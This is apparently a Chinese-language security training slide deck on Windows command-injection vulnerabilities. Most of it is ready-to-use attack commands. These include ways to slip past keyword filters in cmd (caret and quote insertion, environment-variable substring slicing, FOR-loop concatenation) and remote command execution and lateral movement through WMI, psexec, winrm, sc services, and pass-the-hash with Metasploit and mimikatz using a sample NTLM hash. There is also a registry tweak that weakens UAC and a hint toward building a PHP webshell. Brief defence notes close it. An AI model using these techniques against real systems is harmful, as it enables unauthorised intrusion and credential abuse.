# 4.26-Practical-windows-命令执行下的N种姿势

---

## 什么是Windows命令执行漏洞

---

命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()等函数，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。

---

## 命令执行漏洞分类

--

### web代码层命令执行：代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在Web应用中通过system函数来调用，如果开发人员使用不正确的输入过滤机制，攻击者可能会绕过过滤，输入包含特殊字符的恶意代码：
```bash
system("/bin/program --arg $arg");
```

--

### 代码注入漏洞
代码注入漏洞允许攻击者将恶意代码注入到应用程序中，并以应用程序的上下文来执行命令，包括 SQL 注入、OS 命令注入等：
bash破壳漏洞(CVE-2014-6271)、MS08-67、永恒之蓝

--

### 调用的第三方组件存在代码执行漏洞
WordPress中用来处理图片的ImageMagick组件  
JAVA中的命令注入漏洞（struts2/ElasticsearchGroovy等）  
vBulletin 5.x版本通杀远程代码执行  
ThinkPHP命令执行  

---

# 漏洞利用方法

---
## windows命令执行漏洞绕过过滤

--

### 1.符号与命令的关系

--

`”` 和 `^` 还有成对的圆括号 `()` 符号并不会影响命令的执行。在windows环境下，命令可以不区分大小写,可以加无数个 `”` 但不能同时连续加2个 `^` 符号，因为 `^` 号是cmd中的转义符，跟在他后面的符号会被转义。如果在命令执行的时候遇到了拦截命令的关键字，那么就可以使用添加符号的方式绕过，这种方法使用更隐蔽的方式表达了相同的意思:
```bash
whoami #正常执行
wh""o^am"i #正常执行
((((Wh^o^am""i)))) #正常执行
w"""""""""""""hoa^^m""i #执行错误
```

--

### 2.了解set命令和windows变量

--

set命令可以用来设置一个变量,用两个%括起来的变量，会引用其变量内的值：
```bash
set a=1 #设置变量a，值为1
echo a #此时输出结果为"a"
echo %a% #此时输出结果为"1"
```

--

通过设置变量为命令，结合使用%，可以执行命令：
```bash
set a=whoami #设置变量a的值为whoami
%a% #引用变量a的值，直接执行了whoami命令
```

--

通过组合拼接，可以执行命令：
```bash
set a=w""ho
set b=a^mi
#根据前一知识点进行组合，正常执行whoami
%a%%b%

#在变量中设置空格，最后调用变量来执行命令
set a=ser&& set b=ne&& set c=t u && call %b%%c%%a%
```

--

通常我们也可以自定义一个或者多个环境变量，利用环境变量值中的字符，提取并拼接出最终想要的cmd命令。如:
```bash
#可以拼接出cmd命令：net user
Cmd /C "set envar=net user && call echo %envar%"
```

--

也可以定义多个环境变量进行拼接命令串，提高静态分析的复杂度：
```bash
#cmd命令的 `“/C”` 参数，`Cmd /C “string”` 表示：执行字符串string指定的命令，然后终止。
cmd /c "set envar1=ser&& set envar2=ne&& set envar3=t u&&call echo %envar2%%envar3%%envar1%"
```

--

### 3.windows进阶，切割字符串

--

进阶一下，命令行也有类似php或者python之类的语言中的截取字符串的用法。拿whoami来举例：

```bash
#取出a的值中的所有字符，此时正常执行whoami
%a:~0% 

#取出a的值，从第0个位置开始，取6个值,此时因为whoami总共就6个字符，所以取出后正常执行whoami
%a:~0,6% 

#取5个值，whoam无此命令
%a:~0,5% 

#取4个值，whoa无此命令
%a:~0,4% 
```

--

输入 `set` 查看目前有哪些变量，可以看到电脑上的环境变量还是挺多的，几乎可以用这种方式执行任何命令，因为这些变量的值，几乎都有26个字母在了，以 `CommonProgramFiles=C:\Program Files\Common Files` 为例：  
```bash
#如果命令执行不允许空格，被过滤
net%CommonProgramFiles:~10,1%user

#配合符号一起使用
n^et%CommonProgramFiles:~10,1%us^er  

#列出C盘根目录，~10,1对应空格，~0,3对应"C:\" 
d^i^r%CommonProgramFiles:~10,1%%commonprogramfiles:~0,3% 
``` 

--

假如环境变量里没有我们需要的字符怎么办呢，那就自己设置:
```bash
#这段字符串可以组合成一个php一句话木马
set TJ=a bcde/$@\";fgphvlrequst?  
```  

--

### 4.逻辑运算符在绕过中的作用

--

符号 `|` 在cmd中，可以连接命令，且只会执行后面那条命令:
```bash
whoami | ping www.baidu.com

ping www.baidu.com | wh""oam^i

#两条命令都只会执行后面的
```

--

而 `||` 符号的情况下，只有前面的命令失败，才会执行后面的语句:
```bash
ping 127.0.0.1 || whoami #不执行whoami

ping xxx. || whoami #执行whoami 
```

--

而 `&` 符号，前面的命令可以成功也可以失败，都会执行后面的命令，其实也可以说是只要有一条命令能执行就可以了，但whoami放在前面基本都会被检测:
```bash
ping 127.0.0.1 & whoami #执行whoami

ping xxx. & whoami #执行whoami 
```

--

而 `&&` 符号就必须两条命令都为真才可以了:
```bash
ping www.baidu.com -n 1 && whoami #执行whoami

ping www && whoami #不执行whoami
```

--

### 5.利用For循环拼接命令

--

For循环经常被用来混淆处理cmd命令，使得cmd命令看起来复杂且难以检测。最常用的For循环参数有 /L,/F参数。FOR 参数 %变量名 IN (相关文件或命令) DO 执行的命令。  

```bash
#以增量形式从开始到结束的一个数字序列命令
for /L %variable in (start,step,end) do command [command-parameters] 

#该命令会执行打开5个cmd窗口
cmd /C "for /L %i in (1,1,5) do start cmd" 

```

--

`/F` 参数： 是最强大的命令，用来处理文件和一些命令的输出结果。
```bash
#(file-set) 为文件名，for会依次将file-set中的文件打开
FOR /F ["options"] %variable IN (file-set) DO command [command-parameters] 

#(“string”)代表字符串
FOR /F ["options"] %variable IN ("string") DO command [command-parameters]

#(‘command’)代表命令
FOR /F ["options"] %variable IN ('command') DO command [command-parameters] 
```

--

假如文件aa.txt中有如下内容：  
第1行第1列 第1行第2列  
第2行第1列 第2行第2列  
 
```bash
#只会输出aa.txt，并不会读取其中的内容
for %i in (aa.txt) do echo %i

#读出aa.txt里面的所有内容，把它作为一个集合，并且以每一行作为一个元素，默认以空格键或Tab键作为分隔符
for /F "delims= " %i in (aa.txt) do echo %i 

#将delims设置为空格，是将每个元素以空格分割，默认只取分割之后的第一个元素。如果我们想得到第二列数据，就要用到tokens=2
for /F "tokens=2 delims= " %i in (aa.txt) do echo %i 
```

---

## Windows远程执行cmd命令的9种方法
远程执行命令方式及对应端口:  

```
IPC$+AT 445
PSEXEC 445
WMI 135
Winrm 5985(HTTP)&5986(HTTPS)
```

--

### 1.WMI执行命令方式,无回显:
```bash
wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create "cmd.exe /c ipconfig>d:\result.txt"
```

--

### 2.使用Hash直接登录Windows（HASH传递）:
抓取windows hash值,得到administrator的hash:
```
598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF
```  
```bash
msf调用payload：
use exploit/windows/smb/psexec
show options
set RHOST 192.168.81.129
set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF
set SMBUser Administrator
show options
run
```

--

### 3.mimikatz传递hash方式连接+at计划任务执行命令：
```bash
#传递hash
mimikatz.exe privilege::debug "sekurlsa::pth /domain:. /user:administrator /ntlm:2D20D252A479F485CDF5E171D93985BF" 
dir \\192.168.1.185\c$
```

--

### 4.WMIcmd执行命令,有回显：
```bash
WMIcmd.exe -h 192.168.1.152 -d hostname -u pt007 -p admin123 -c "ipconfig"
```
程序下载地址：
https://github.com/nccgroup/WMIcmd/releases

--

### 5.Cobalt strkie远程执行命令与hash传递攻击:  
[Cobalt Strike](https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html)  

--

### 6.psexec.exe远程执行命令:
```bash
#接受许可协议
psexec /accepteula 
sc delete psexesvc
psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
```

--

### 7.psexec.vbs远程执行命令:
```bash
cscript psexec.vbs 192.168.1.158 pt007 admin123 "ipconfig"
```

--

### 8.winrm远程执行命令:
```bash
#肉机上面快速启动winrm服务，并绑定到5985端口：
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
netstat -ano|find "5985"

#客户端连接方式：
winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 "whoami /all"
winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 cmd

#UAC问题,修改后，普通管理员登录后也是高权限:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 "whoami /groups"
```

--

### 9.远程命令执行sc:
建立ipc连接(参见net use + at)后上传等待运行的bat或exe程序到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行程序）：
```bash
net use \\192.168.17.138\c$ "admin123" /user:pt007
net use
dir \\192.168.17.138\c$
copy test.exe \\192.168.17.138\c$
sc \\192.168.17.138 create test binpath= "c:\test.exe"
sc \\192.168.17.138 start test
sc \\192.168.17.138 del test
```

---

# 漏洞利用案例

---

## Windows漏洞利用之MS08-067远程代码执行漏洞复现

--

### 一、漏洞原理
MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure Call，远程过程调用）请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。它影响了某些旧版本的Windows系统，包括：
```
Windows 2000
Windows XP
Windows Server 2003
```

--

### 二、环境搭建
受害机：Windows XP SP1镜像  
攻击机：Kali系统   

Windows XP SP1镜像下载参考：[Windows XP SP1可用的原版iso](https://blog.csdn.net/ddmtjegb12140/article/details/101920059)  
系统安装参考[使用VMware虚拟机安装Windows XP系统](https://blog.csdn.net/linxinfa/article/details/112768896)  

--

### 三、利用Metasploit复现漏洞

---

## 漏洞防御
一方面关闭相关端口、安装杀毒软件和补丁，另一方面在防火墙中进行流量监测，主要是针对数据包中存在的形如"\ ** \ … \ … \ *"这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配。

---

# 安全建议